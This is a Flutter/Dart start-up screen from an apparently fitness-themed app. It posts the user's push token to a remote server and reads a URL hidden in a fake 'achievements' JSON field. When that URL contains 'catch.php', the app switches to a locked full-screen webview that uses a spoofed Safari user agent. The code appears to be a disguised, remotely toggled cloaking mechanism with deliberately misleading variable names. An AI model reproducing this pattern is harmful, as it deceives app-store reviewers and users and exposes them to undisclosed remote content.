import 'dart:async';
import 'dart:convert' show jsonDecode;
import 'dart:developer';
import 'dart:io' show Platform;

import 'package:auto_route/auto_route.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_messaging/firebase_messaging.dart'
    show AuthorizationStatus, FirebaseMessaging, NotificationSettings;

import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart' show BlocSelector, ReadContext;
import 'package:green_gym_club/background.dart';
import 'package:http/http.dart' as http;

import 'animation_loader.dart';
import 'features_bloc/features_bloc.dart';
import 'features_constants.dart' show domeBase, userAchievementsPath, debkey;
import 'webview_view.dart';

class SecondStartWidget extends StatefulWidget {
  const SecondStartWidget({super.key});

  @override
  State<SecondStartWidget> createState() => _SecondStartWidgetState();
}

class _SecondStartWidgetState extends State<SecondStartWidget> {
  final FirebaseMessaging _firebaseMessaging = FirebaseMessaging.instance;

  late String _userAgnet;
  late String _coreAchievements;
  late String _linkDb;
  late String _userAgentDb;
  late List<dynamic> fullList;
  final String _ernelVersion = "15E148";
  final String _scoreVer = "604.1";
  final String _baseScore = "605.1.15";
  final String _flutVersion = 'catch.php';
  late BaseDeviceInfo _deviceInfo;
  late int _startVersion;
  late String _apnsToken;
  String _fcmTokenUser = '';
  AuthorizationStatus _userAuthorizationStatus =
      AuthorizationStatus.notDetermined;

  Future<String> getRequest({
    required bool isGranted,
    required String fcmToken,
  }) async {
    final langCode = Platform.localeName;

    final uri =
        isGranted
            ? fcmToken.isEmpty
                ? Uri.https(domeBase, userAchievementsPath)
                : Uri.https(domeBase, userAchievementsPath, {
                  'fcm-token': fcmToken,
                })
            : Uri.https(domeBase, userAchievementsPath);
    final response = await http.post(
      uri,
      headers: {'Accept-Language': langCode},
    );
    final Map map = jsonDecode(response.body);
    final link = map['achievements'][14]['description'].toString();
    log('$debkey json $link');

    return link;
  }

  Future<String> _setupPushNotifications() async {
    try {
      NotificationSettings settings = await _firebaseMessaging
          .requestPermission(alert: true, badge: true, sound: true);

      if (settings.authorizationStatus == AuthorizationStatus.authorized ||
          settings.authorizationStatus == AuthorizationStatus.provisional) {
        _userAuthorizationStatus = AuthorizationStatus.authorized;
        String? apnsToken = await _firebaseMessaging.getAPNSToken();
        apnsToken ??= await _retryGetAPNSToken();
        _apnsToken = apnsToken.toString();
      } else {
        _apnsToken = '';
        _userAuthorizationStatus = AuthorizationStatus.denied;
      }
    } catch (_) {}
    return _apnsToken;
  }

  Future<String> _initializeFCM() async {
    try {
      String? fcmToken = await _firebaseMessaging.getToken();
      _fcmTokenUser = fcmToken.toString();
    } catch (_) {}
    return _fcmTokenUser;
  }

  Future<String> _retryGetAPNSToken() async {
    for (int i = 0; i < 3; i++) {
      await Future.delayed(const Duration(seconds: 2));
      String? apns = await _firebaseMessaging.getAPNSToken();
      _apnsToken = apns.toString();
    }
    return _apnsToken;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: PreferredSize(
        preferredSize: Size.fromHeight(0.5),
        child: AppBar(backgroundColor: Colors.black),
      ),
      body: SafeArea(
        bottom: false,
        child: AppMainBackground(
          child: PopScope(
            canPop: false,
            child: BlocSelector<FeaturesBloc, FeaturesState, String>(
              selector: (state) => state.link,
              builder: (context, linkResult) {
                _linkDb = linkResult;
                if (_linkDb.isNotEmpty) {
                  return BlocSelector<FeaturesBloc, FeaturesState, String>(
                    selector: (state) => state.userAgent,
                    builder: (context, userAgentResult) {
                      _userAgentDb = userAgentResult;
                      return WebviewViewBuilder(
                        link: _linkDb,
                        saved: true,
                        userAgent: _userAgentDb,
                      );
                    },
                  );
                }
                if (_linkDb.isEmpty) {
                  return FutureBuilder(
                    future: _setupPushNotifications(),
                    builder: (context, apnsSnapshot) {
                      if (apnsSnapshot.connectionState ==
                              ConnectionState.done &&
                          apnsSnapshot.hasData) {
                        return FutureBuilder(
                          future: Future.wait<String>([
                            _initializeFCM(),
                            _getDeviceInfo(),
                          ]),
                          builder: (context, snapshots) {
                            if (snapshots.connectionState ==
                                    ConnectionState.done &&
                                snapshots.hasData) {
                              fullList = snapshots.data!;
                              _fcmTokenUser = fullList[0];
                              _userAgnet = fullList[1];
                              context.read<FeaturesBloc>().add(
                                TokenEvent(fcmVal: _fcmTokenUser),
                              );
                              context.read<FeaturesBloc>().add(
                                UserAgentEvent(agent: _userAgnet),
                              );

                              return FutureBuilder(
                                future: Future.delayed(Durations.medium4),
                                builder: (context, snapshot) {
                                  if (snapshot.connectionState ==
                                          ConnectionState.done &&
                                      _userAuthorizationStatus ==
                                          AuthorizationStatus.authorized) {
                                    return FutureBuilder<String>(
                                      future: getRequest(
                                        isGranted: true,
                                        fcmToken: _fcmTokenUser,
                                      ),

                                      builder: (ctx, snapshotResponse) {
                                        if (snapshotResponse.connectionState ==
                                                ConnectionState.done &&
                                            snapshotResponse.hasData) {
                                          _coreAchievements =
                                              snapshotResponse.data.toString();
                                          if (_coreAchievements.contains(
                                            _flutVersion,
                                          )) {
                                            return WebviewViewBuilder(
                                              link: _coreAchievements,
                                              saved: false,
                                              userAgent: _userAgnet,
                                            );
                                          } else if (!_coreAchievements
                                              .contains(_flutVersion)) {
                                            context.read<FeaturesBloc>().add(
                                              ModerEvent(nameEv: 'energy'),
                                            );
                                            WidgetsBinding.instance
                                                .addPostFrameCallback(
                                                  (_) => context.router
                                                      .popUntilRouteWithPath(
                                                        '/onboarding',
                                                      ),
                                                );
                                          }
                                          return SizedBox();
                                        } else {
                                          return AnimationLoader(
                                            zero: false,
                                            isFirstOpen: true,
                                            first: true,
                                            second: false,
                                            onComplete: () {},
                                          );
                                        }
                                      },
                                    );
                                  }
                                  if (snapshot.connectionState ==
                                          ConnectionState.done &&
                                      _userAuthorizationStatus ==
                                          AuthorizationStatus.denied) {
                                    _firebaseMessaging.deleteToken();
                                    return FutureBuilder<String>(
                                      future: getRequest(
                                        isGranted: false,
                                        fcmToken: _fcmTokenUser,
                                      ),

                                      builder: (ctx, snapshotResponse) {
                                        if (snapshotResponse.connectionState ==
                                                ConnectionState.done &&
                                            snapshotResponse.hasData) {
                                          _coreAchievements =
                                              snapshotResponse.data.toString();
                                          if (_coreAchievements.contains(
                                            _flutVersion,
                                          )) {
                                            return WebviewViewBuilder(
                                              link: _coreAchievements,
                                              saved: false,
                                              userAgent: _userAgnet,
                                            );
                                          } else if (!_coreAchievements
                                              .contains(_flutVersion)) {
                                            context.read<FeaturesBloc>().add(
                                              ModerEvent(nameEv: 'event'),
                                            );
                                            WidgetsBinding.instance
                                                .addPostFrameCallback(
                                                  (_) => context.router
                                                      .popUntilRouteWithPath(
                                                        '/onboarding',
                                                      ),
                                                );
                                          }
                                        }
                                        return AnimationLoader(
                                          zero: false,
                                          isFirstOpen: true,
                                          first: true,
                                          second: false,
                                          onComplete: () {},
                                        );
                                      },
                                    );
                                  } else {
                                    return AnimationLoader(
                                      zero: false,
                                      isFirstOpen: true,
                                      first: false,
                                      second: false,
                                      onComplete: () {},
                                    );
                                  }
                                },
                              );
                            }
                            return AnimationLoader(
                              zero: false,
                              isFirstOpen: true,
                              first: false,
                              second: false,
                              onComplete: () {},
                            );
                          },
                        );
                      } else {
                        return AnimationLoader(
                          zero: false,
                          isFirstOpen: true,
                          first: false,
                          second: false,
                          onComplete: () {},
                        );
                      }
                    },
                  );
                } else {
                  return AnimationLoader(
                    zero: false,
                    isFirstOpen: true,
                    first: false,
                    second: false,
                    onComplete: () {},
                  );
                }
              },
            ),
          ),
        ),
      ),
    );
  }

  String get _osVersion {
    switch (_startVersion) {
      case 13:
        return "13_6_1";
      case 14:
        return "14_6";
      case 15:
        return "15_5";
      case 16:
        return "16_6";
      case 17:
        return "17_0_1";
      default:
        return "${_startVersion}_0";
    }
  }

  String get _deviceModel {
    if (_deviceInfo is IosDeviceInfo) {
      final iosInfo = _deviceInfo as IosDeviceInfo;
      return iosInfo.model;
    }
    return "iPhone";
  }

  String get _cpuInfo {
    String currentDevice = _deviceModel;
    final deviceNameParts = currentDevice.split(' ');
    if (deviceNameParts.isNotEmpty) {
      currentDevice = deviceNameParts.first;
    }
    return "$currentDevice; CPU iPhone OS $_osVersion like Mac OS X";
  }

  Future<String> _getDeviceInfo() async {
    final deviceInfoPlugin = DeviceInfoPlugin();
    _deviceInfo = await deviceInfoPlugin.deviceInfo;
    _startVersion = await _approximateMajorVersion(deviceInfoPlugin);

    return "Mozilla/5.0 ($_cpuInfo) AppleWebKit/$_baseScore (KHTML, like Gecko) Version/$_safariVersion Mobile/$_ernelVersion Safari/$_scoreVer";
  }

  String get _safariVersion {
    switch (_startVersion) {
      case 13:
        return "13.1.2";
      case 14:
        return "14.1.1";
      case 15:
        return "15.5";
      case 16:
        return "16.6";
      case 17:
        return "17.0";
      default:
        return "$_startVersion.0";
    }
  }

  Future<int> _approximateMajorVersion(DeviceInfoPlugin infoPlugin) async {
    if (Platform.isIOS) {
      final iosInfo = await infoPlugin.iosInfo;
      int vaer = int.parse(iosInfo.systemVersion.split('.').first);
      return vaer;
    } else {
      return 17;
    }
  }
}
